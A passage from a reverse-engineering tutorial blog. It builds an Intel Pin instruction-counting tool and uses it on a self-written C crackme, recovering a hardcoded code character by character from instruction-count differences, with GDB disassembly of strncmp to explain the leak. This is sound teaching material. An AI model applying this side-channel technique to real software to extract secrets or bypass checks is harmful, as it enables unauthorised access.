</span><span class="line"><span class="c1">// modified version of /pintool/source/tools/ManualExamples/inscount0.cpp</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="c1">// The running count of instructions is kept here</span>
</span><span class="line"><span class="c1">// make it static to help the compiler optimize docount</span>
</span><span class="line"><span class="k">static</span> <span class="n">UINT64</span> <span class="n">icount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="c1">// This function is called before every instruction is executed</span>
</span><span class="line"><span class="c1">// increase the count every time it is called, which is before every instruction</span>
</span><span class="line"><span class="n">VOID</span> <span class="n">docount</span><span class="p">()</span> <span class="p">{</span> <span class="n">icount</span><span class="o">++</span><span class="p">;</span> <span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="c1">// Pin calls this function every time a new instruction is encountered</span>
</span><span class="line"><span class="n">VOID</span> <span class="n">Instruction</span><span class="p">(</span><span class="n">INS</span> <span class="n">ins</span><span class="p">,</span> <span class="n">VOID</span> <span class="o">*</span><span class="n">v</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">    <span class="c1">// Insert a call to docount before every instruction, no arguments are passed</span>
</span><span class="line">    <span class="c1">// ins: instruction about to be executed</span>
</span><span class="line">    <span class="c1">// IPOINT_BEFORE: call is placed before each instruction</span>
</span><span class="line">    <span class="c1">// (AFUNPTR)docount: name of the function to call before every instruction</span>
</span><span class="line">    <span class="c1">// If any arguments are to be passed to the called function, they will be placed here</span>
</span><span class="line">    <span class="c1">// IARG_END: indicates the end of arguments</span>
</span><span class="line">
</span><span class="line">    <span class="c1">// as a result before each instruction, docount is called</span>
</span><span class="line">    <span class="n">INS_InsertCall</span><span class="p">(</span><span class="n">ins</span><span class="p">,</span> <span class="n">IPOINT_BEFORE</span><span class="p">,</span> <span class="p">(</span><span class="n">AFUNPTR</span><span class="p">)</span><span class="n">docount</span><span class="p">,</span> <span class="n">IARG_END</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="c1">// This function is called when the application exits</span>
</span><span class="line"><span class="n">VOID</span> <span class="n">Fini</span><span class="p">(</span><span class="n">INT32</span> <span class="n">code</span><span class="p">,</span> <span class="n">VOID</span> <span class="o">*</span><span class="n">v</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">    <span class="c1">// print the number of executed instructions</span>
</span><span class="line">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;Count: &quot;</span> <span class="o">&lt;&lt;</span> <span class="n">icount</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span><span class="line">
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="cm">/* ===================================================================== */</span>
</span><span class="line"><span class="cm">/* Print Help Message                                                    */</span>
</span><span class="line"><span class="cm">/* ===================================================================== */</span>
</span><span class="line">
</span><span class="line"><span class="n">INT32</span> <span class="n">Usage</span><span class="p">()</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&quot;This tool counts the number of dynamic instructions executed&quot;</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
</span><span class="line">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="cm">/* ===================================================================== */</span>
</span><span class="line"><span class="cm">/* Main                                                                  */</span>
</span><span class="line"><span class="cm">/* ===================================================================== */</span>
</span><span class="line"><span class="cm">/*   argc, argv are the entire command line: pin -t &lt;toolname&gt; -- ...    */</span>
</span><span class="line"><span class="cm">/* ===================================================================== */</span>
</span><span class="line">
</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">    <span class="c1">// Initialize pin</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="n">PIN_Init</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">))</span> <span class="k">return</span> <span class="n">Usage</span><span class="p">();</span>
</span><span class="line">
</span><span class="line">    <span class="c1">// Register Instruction to be called to instrument instructions</span>
</span><span class="line">    <span class="n">INS_AddInstrumentFunction</span><span class="p">(</span><span class="n">Instruction</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">    <span class="c1">// Register Fini to be called when the application exits</span>
</span><span class="line">    <span class="n">PIN_AddFiniFunction</span><span class="p">(</span><span class="n">Fini</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span><span class="line">
</span><span class="line">    <span class="c1">// Start the program, never returns</span>
</span><span class="line">    <span class="n">PIN_StartProgram</span><span class="p">();</span>
</span><span class="line">
</span><span class="line">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>To compile it, we can use the provided makefile. In ManualExamples run <code>make obj-ia32/myins.so</code>. Note the filename and path. If everything works correctly, we will have <code>myins.so</code>. Let’s copy it to where we want to write our example program.</p>

<h3 id="crackme-1---example-c-program">Crackme 1 - Example C Program</h3>
<p>The program is quite simple, it checks the first argument against the hardcoded value <code>7bc3a60fbf38e98f6fef654afa26d270</code>. We will use this program to test our Pin tool.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>crkme1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
</pre></td><td class="code"><pre><code class="cpp"><span class="line"><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class="line"><span class="cp">#include &lt;string.h&gt;</span>
</span><span class="line">
</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
</span><span class="line"><span class="p">{</span>
</span><span class="line">
</span><span class="line">  <span class="k">if</span> <span class="p">(</span> <span class="n">argc</span><span class="o">!=</span><span class="mi">2</span> <span class="p">)</span>
</span><span class="line">  <span class="p">{</span>
</span><span class="line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;usage: ./crkme1 code</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">
</span><span class="line">  <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;7bc3a60fbf38e98f6fef654afa26d270&quot;</span><span class="p">;</span>
</span><span class="line">
</span><span class="line">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">code</span><span class="p">,</span><span class="mi">32</span><span class="p">)</span> <span class="p">)</span>
</span><span class="line">  <span class="p">{</span>
</span><span class="line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Correct</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="k">else</span>
</span><span class="line">  <span class="p">{</span>
</span><span class="line">    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Wrong</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">
</span><span class="line">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Remember to use the <code>ggdb</code> option to compile with debug information (for GDB). From what I understand this is very similar to the <code>g</code> option. We will be using GDB to dive into the binary to observe strncmp’s behavior. Let’s use <code>gcc -ggdb -o crkme1 crkme1.c</code>.</p>

<h3 id="using-pin-with-crkme1">Using Pin with Crkme1</h3>
<p>To run our Pin tool against any executable execute <code>pin -t myins.so -- ./crkme1 012345</code>. Now let’s experiment with some input. Our super secret code starts with <code>7b</code> so I will be <code>fuzzing</code> (for very simplistic definition of fuzzing) the first character and look at the number of executed instructions.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Changing first character </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>pin -t myins.so -- ./crkme1 1zzz
</span><span class="line">Wrong
</span><span class="line">Count: 100013
</span><span class="line"><span class="nv">$ </span>pin -t myins.so -- ./crkme1 5zzz
</span><span class="line">Wrong
</span><span class="line">Count: 100013
</span><span class="line"><span class="nv">$ </span>pin -t myins.so -- ./crkme1 7zzz
</span><span class="line">Wrong
</span><span class="line">Count: 100015 <span class="c"># interesting</span>
</span><span class="line"><span class="nv">$ </span>pin -t myins.so -- ./crkme1 bzzz
</span><span class="line">Wrong
</span><span class="line">Count: 100013
</span><span class="line"><span class="nv">$pin</span> -t myins.so -- ./crkme1 @zzz
</span><span class="line">Wrong
</span><span class="line">Count: 100013
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Notice a pattern? Seems like we executed two extra instructions when our first character matched. Assuming our theory is correct and we have the first character <code>7</code>, let’s experiment with the second character.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Changing second character </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>pin -t myins.so -- ./crkme1 71zz
</span><span class="line">Wrong
</span><span class="line">Count: 100015
</span><span class="line"><span class="nv">$ </span>pin -t myins.so -- ./crkme1 75zz
</span><span class="line">Wrong
</span><span class="line">Count: 100015
</span><span class="line"><span class="nv">$ </span>pin -t myins.so -- ./crkme1 7bzz
</span><span class="line">Wrong
</span><span class="line">Count: 100017 <span class="c"># 2 extra instructions executed</span>
</span><span class="line"><span class="nv">$ </span>pin -t myins.so -- ./crkme1 7@zz
</span><span class="line">Wrong
</span><span class="line">Count: 100015
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>At this point you probably have a good idea why this is happening. But let’s look at the assembly code.</p>

<h3 id="gdb-and-strncmp">GDB and strncmp</h3>
<p>Good thing we compiled our binary with debug information. Let’s look at the assembly code for strncmp:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Running crkme1 in gdb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="c"># q starts gdb in quiet mode</span>
</span><span class="line"><span class="nv">$ </span>gdb ./crkme1 -q
</span><span class="line">Reading symbols from /root/Desktop/kek/crkme1...done.
</span><span class="line"><span class="c"># putting a break on strncmp, this is possible because we compiled with -ggdb option</span>
</span><span class="line"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>strncmp
</span><span class="line">Breakpoint 1 at 0x8048350
</span><span class="line"><span class="c"># passing 7bzz as a run-time argument. r stands for run</span>
</span><span class="line"><span class="o">(</span>gdb<span class="o">)</span> r 7bzz
</span><span class="line">Starting program: /root/Desktop/kek/crkme1 7bzz
</span><span class="line">
</span><span class="line">Breakpoint 1, 0xb7f82b80 in ?? <span class="o">()</span> from /lib/i386-linux-gnu/i686/cmov/libc.so.6
</span><span class="line"><span class="o">(</span>gdb<span class="o">)</span> disass
</span><span class="line">No <span class="k">function </span>contains program counter <span class="k">for </span>selected frame.
</span><span class="line"><span class="c"># oops what happened here?</span>
</span><span class="line"><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>To get a better a picture of the problem, we’re going to go through the same process in verbose mode in GDB using the <code>set verbose on</code> command.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>Running in gdb with verbose on </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
</pre></td><td class="code"><pre><code class="bash"><span class="line"><span class="nv">$ </span>gdb ./crkme1 -q
</span><span class="line">Reading symbols from /root/Desktop/kek/crkme1...done.
</span><span class="line"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>verbose on
</span><span class="line"><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break </span>strncmp
</span><span class="line">Breakpoint 1 at 0x8048350
</span><span class="line"><span class="o">(</span>gdb<span class="o">)</span> r 7bzz
</span><span class="line">Starting program: /root/Desktop/kek/crkme1 7bzz
</span><span class="line">Reading symbols from /lib/ld-linux.so.2...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class="line">Loaded symbols <span class="k">for</span> /lib/ld-linux.so.2
</span><span class="line">Reading symbols from system-supplied DSO at 0xb7fe1000...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class="line"><span class="c"># aha, no debugging symbols found for libc6</span>
</span><span class="line">Reading symbols from /lib/i386-linux-gnu/i686/cmov/libc.so.6...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class="line">Loaded symbols <span class="k">for</span> /lib/i386-linux-gnu/i686/cmov/libc.so.6
</span><span class="line">
</span><span class="line">Breakpoint 1, 0xb7f82b80 in ?? <span class="o">()</span> from /lib/i386-linux-gnu/i686/cmov/libc.so.6
</span><span class="line"><span class="o">(</span>gdb<span class="o">)</span> disass
</span><span class="line">No <span class="k">function </span>contains program counter <span class="k">for </span>selected frame.
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>According to line 12, we we need the debugging symbols for libc to look inside the code. 
On Kali use <code>apt-get install libc6-dbg</code>. Here we go again:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>After installing libc6-dbg </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">root@kali:</span><span class="err">~/</span><span class="nf">Desktop</span><span class="o">/</span><span class="nv">kek#</span> <span class="nv">gdb</span> <span class="nv">.</span><span class="o">/</span><span class="nv">crkme1</span> <span class="o">-</span><span class="nv">q</span>
</span><span class="line"><span class="nf">Reading</span> <span class="nv">symbols</span> <span class="nv">from</span> <span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">Desktop</span><span class="o">/</span><span class="nv">kek</span><span class="o">/</span><span class="nv">crkme1...done.</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">break</span> <span class="nv">strncmp</span>
</span><span class="line"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="nv">at</span> <span class="mh">0x8048350</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nv">r</span> <span class="mi">7</span><span class="nv">bzz</span>
</span><span class="line"><span class="nf">Starting</span> <span class="nv">program</span><span class="p">:</span> <span class="o">/</span><span class="nv">root</span><span class="o">/</span><span class="nv">Desktop</span><span class="o">/</span><span class="nv">kek</span><span class="o">/</span><span class="nv">crkme1</span> <span class="mi">7</span><span class="nv">bzz</span>
</span><span class="line">
</span><span class="line"><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="nv">__strncmp_ssse3</span> <span class="p">()</span>
</span><span class="line">    <span class="nf">at</span> <span class="nv">..</span><span class="o">/</span><span class="nv">sysdeps</span><span class="o">/</span><span class="nv">i386</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">multiarch</span><span class="o">/</span><span class="nv">strcmp</span><span class="o">-</span><span class="nb">ss</span><span class="nv">se3.S</span><span class="p">:</span><span class="mi">65</span>
</span><span class="line"><span class="err">65</span>	<span class="nf">..</span><span class="o">/</span><span class="nv">sysdeps</span><span class="o">/</span><span class="nv">i386</span><span class="o">/</span><span class="nv">i686</span><span class="o">/</span><span class="nv">multiarch</span><span class="o">/</span><span class="nv">strcmp</span><span class="o">-</span><span class="nb">ss</span><span class="nv">se3.S</span><span class="p">:</span> <span class="nv">No</span> <span class="nv">such</span> <span class="nv">file</span> <span class="nv">or</span> <span class="nb">di</span><span class="nv">rectory.</span>
</span><span class="line"><span class="err">(</span><span class="nf">gdb</span><span class="p">)</span> <span class="nb">di</span><span class="nv">sass</span>
</span><span class="line"><span class="nf">Dump</span> <span class="nv">of</span> <span class="nv">assembler</span> <span class="nv">code</span> <span class="nv">for</span> <span class="nv">function</span> <span class="nv">__strncmp_ssse3</span><span class="p">:</span>
</span><span class="line"><span class="err">=&gt;</span> <span class="err">0</span><span class="nf">xb7f82b80</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">ebp</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7f82b81</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7f82b85</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7f82b89</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7f82b8d</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">ebp</span><span class="p">,</span><span class="mh">0x10</span>
</span><span class="line">   <span class="err">0</span><span class="nf">xb7f82b90</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jb</span>     <span class="mh">0xb7f843d0</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6224</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Now we can see what happens in strncmp. The following is the cleaned up version of the assembly of strncmp.</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>strncmp </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="c1">; assuming we called strncmp (argv[1],code,32);</span>
</span><span class="line">
</span><span class="line"><span class="err">0</span><span class="nf">xb7f82b80</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">push</span>   <span class="nb">ebp</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f82b81</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span> 	<span class="nv">mov</span>    <span class="nb">edx</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x8</span><span class="p">]</span>  <span class="c1">; argv[1] or &quot;7bzz&quot;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f82b85</span> <span class="o">&lt;+</span><span class="mi">5</span><span class="o">&gt;</span><span class="p">:</span> 	<span class="nv">mov</span>    <span class="nb">eax</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0xc</span><span class="p">]</span>  <span class="c1">; code or &quot;7bc3 ..&quot;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f82b89</span> <span class="o">&lt;+</span><span class="mi">9</span><span class="o">&gt;</span><span class="p">:</span> 	<span class="nv">mov</span>    <span class="nb">ebp</span><span class="p">,</span><span class="kt">DWORD</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">0x10</span><span class="p">]</span> <span class="c1">; 32 or 0x20</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f82b8d</span> <span class="o">&lt;+</span><span class="mi">13</span><span class="o">&gt;</span><span class="p">:</span> 	<span class="nv">cmp</span>    <span class="nb">ebp</span><span class="p">,</span><span class="mh">0x10</span>                 <span class="c1">; 32 compared to 0x10 (16 decimal)</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f82b90</span> <span class="o">&lt;+</span><span class="mi">16</span><span class="o">&gt;</span><span class="p">:</span> 	<span class="nv">jb</span>     <span class="mh">0xb7f843d0</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6224</span><span class="o">&gt;</span>
</span><span class="line"><span class="nf">...</span>
</span><span class="line"><span class="c1">; if number of bytes to compare is bigger than 16</span>
</span><span class="line"><span class="c1">; let&#39;s assume it is and see what happens next</span>
</span><span class="line"><span class="nf">...</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843d0</span> <span class="o">&lt;+</span><span class="mi">6224</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">test</span>   <span class="nb">ebp</span><span class="p">,</span><span class="nb">ebp</span>  <span class="c1">; if (ebp == 0) goto 0xb7f843c3</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843d2</span> <span class="o">&lt;+</span><span class="mi">6226</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0xb7f843c3</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6211</span><span class="o">&gt;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843d4</span> <span class="o">&lt;+</span><span class="mi">6228</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movzx</span>  <span class="nb">ecx</span><span class="p">,</span><span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">eax</span><span class="p">]</span> <span class="c1">; ecx = code</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843d7</span> <span class="o">&lt;+</span><span class="mi">6231</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">edx</span><span class="p">],</span><span class="nb">cl</span>  <span class="c1">; if (code[0] != argv[1][0]) goto 0xb7f843b0;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843d9</span> <span class="o">&lt;+</span><span class="mi">6233</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0xb7f843b0</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6192</span><span class="o">&gt;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843db</span> <span class="o">&lt;+</span><span class="mi">6235</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">test</span>   <span class="nb">cl</span><span class="p">,</span><span class="nb">cl</span>  <span class="c1">; if (code[0] == 0) goto 0xb7f843c3; // have we reached the end of code?</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843dd</span> <span class="o">&lt;+</span><span class="mi">6237</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0xb7f843c3</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6211</span><span class="o">&gt;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843df</span> <span class="o">&lt;+</span><span class="mi">6239</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="nb">ebp</span><span class="p">,</span><span class="mh">0x1</span>  <span class="c1">; if (counter == 1) goto 0xb7f843c3; // was this our last compare?</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843e2</span> <span class="o">&lt;+</span><span class="mi">6242</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">je</span>     <span class="mh">0xb7f843c3</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6211</span><span class="o">&gt;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843e4</span> <span class="o">&lt;+</span><span class="mi">6244</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">movzx</span>  <span class="nb">ecx</span><span class="p">,</span><span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mh">0x1</span><span class="p">]</span>	<span class="c1">; ecx = code[1];</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843e8</span> <span class="o">&lt;+</span><span class="mi">6248</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">cmp</span>    <span class="kt">BYTE</span> <span class="nv">PTR</span> <span class="p">[</span><span class="nb">edx</span><span class="o">+</span><span class="mh">0x1</span><span class="p">],</span><span class="nb">cl</span>  <span class="c1">; if (code[1] != argv[1][1]) goto 0xb7f843b0;</span>
</span><span class="line"><span class="err">0</span><span class="nf">xb7f843eb</span> <span class="o">&lt;+</span><span class="mi">6251</span><span class="o">&gt;</span><span class="p">:</span>	<span class="nv">jne</span>    <span class="mh">0xb7f843b0</span> <span class="o">&lt;</span><span class="nv">__strncmp_ssse3</span><span class="o">+</span><span class="mi">6192</span><span class="o">&gt;</span>
